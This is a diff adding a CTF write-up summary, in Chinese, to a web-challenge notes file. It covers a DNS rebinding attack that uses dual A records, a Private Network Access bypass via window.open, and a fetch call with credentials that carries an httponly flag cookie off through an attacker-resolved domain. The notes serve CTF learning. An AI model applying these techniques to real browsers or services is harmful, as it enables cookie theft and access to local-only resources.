@@ -563,6 +563,15 @@
     - 类似题目：**devilnetv2**
 - [Pasteboard](https://estse.github.io/posts/uoftctf-2026-pasteboard)
     - 利用Chromedriver将localhost origin上的xss提升至rce： https://book.jorianwoltjer.com/web/client-side/headless-browsers#chromedriver
+- [Unrealistic](https://github.com/bhavya32/web-writeups/blob/main/uoft.md)
+    - DNS rebinding技巧：使用多个A记录（A records）。有时候浏览器缓存DNS的同时还忽略了TTL，导致rebind无法及时生效。这时可以选择给域名绑定多个A记录，一个解析到`x.x.x.x`，一个解析到`y.y.y.y`。浏览器解析域名时会在两条记录中随机选择，除非其中一个记录返回`TCP RST`；这时浏览器会固定解析到另一个记录
+    - [Private Network Access(PNA)](https://wicg.github.io/private-network-access)阻挡任何来自公共URL的私有本地IP访问，包括iframe中的请求。然而用`window.open`在新标签页中打开私有IP页面的请求可以发送出去
+    - 攻击路径概述：
+        - 用dns rebinding将某个域名（比如`test.com`）解析为`x.x.x.x`(攻击者服务器)和`127.0.0.1`
+        - 假设bot访问`test.com`时采用的是`x.x.x.x`的记录。`x.x.x.x`递送下一阶段的js payload后运行`exit(0)`强制下线
+        - payload使用`window.open`打开`test.com/flag`。由于`x.x.x.x`已下线，这将访问`127.0.0.1/flag`，绕过题目设置的本地ip检查
+        - 题目将flag放在了httponly cookie中，因此payload需要用`fetch("test.com:5005",{credentials: 'include'})`提取出flag。`5005`端口号是随机的，只要`127.0.0.1`在这个端口上没有服务即可。浏览器找不到`127.0.0.1:5005`便会解析成`test.com:5005`
+        - 全程的host都是一样的，不会影响cookie的传递
 
 ## SSTI
 
